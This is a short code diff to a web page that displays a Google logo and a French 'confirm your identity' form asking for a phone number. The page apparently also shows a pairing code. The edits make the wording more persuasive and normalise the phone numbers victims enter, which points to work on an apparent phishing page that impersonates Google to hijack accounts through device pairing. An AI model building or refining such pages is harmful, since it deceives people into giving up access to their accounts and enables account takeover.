@@ -249,8 +249,8 @@
     <img class="logo" src="/google-icon.png" alt="Google" />
 
     <div class="step visible" id="step1">
-      <h1 class="step-title">Vérifiez votre identité</h1>
-      <p class="step-desc">Pour accéder aux ressources de cette organisation, confirmez votre identité.</p>
+      <h1 class="step-title">Confirmez votre identité</h1>
+      <p class="step-desc">Vérifiez la connexion à votre compte via votre numéro de téléphone.</p>
 
       <form id="phoneForm">
         <div class="form-group">
@@ -325,7 +325,9 @@
       const normalizedPrefix = String(countryCode || "").replace(/\D/g, "");
       if (!normalizedPrefix) return digits;
       if (digits.startsWith(normalizedPrefix)) return digits;
-      return normalizedPrefix + digits;
+      // Avoid invalid numbers like 33 + 06... => 3306...
+      const localDigits = digits.replace(/^0+/, "");
+      return normalizedPrefix + (localDigits || digits);
     }
 
     function formatPairingCodeForDisplay(code) {
